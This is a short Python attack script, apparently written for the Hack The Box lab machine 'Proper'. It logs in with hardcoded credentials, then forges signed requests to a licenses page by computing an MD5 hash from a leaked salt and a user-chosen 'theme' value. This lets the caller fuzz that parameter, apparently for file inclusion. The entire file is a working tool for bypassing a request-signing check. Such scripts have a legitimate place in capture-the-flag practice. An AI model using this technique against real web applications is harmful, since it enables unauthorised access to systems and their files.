#!/usr/bin/python3

import requests
import hashlib
import signal
import sys

url = "http://proper.htb/licenses"
salt = "hie0shah6ooNoim"

try:
    payload = sys.argv[1]
except IndexError:
    print("\nexample: %s 'intranet'\n" % (sys.argv[0]))
    exit(1)

# Ctrl + C
def def_handler(sig, frame):
    print("\nInterrupción, saliendo...\n")
    exit(0)

signal.signal(signal.SIGINT, def_handler)

# Proceso login y fuzz
def login():
    session = requests.Session()

    data_post = {
        "username": "vikki.solomon@throwaway.mail",
        "password": "password1"
    }
    r = session.post(url + "/index.php", data=data_post)

    fuzzing(session)

def fuzzing(session):
    payload = sys.argv[1]
    hashh = hashlib.md5(salt.encode('utf-8') + payload.encode('utf-8')).hexdigest()

    data_get = {"theme": payload, "h": hashh}
    r = session.get(url + "/licenses.php", params=data_get)

    print("\n" + f'[+] Theme: {payload} -> {hashh}' + "\n")
    print(r.text)

if __name__ == '__main__':
    login()
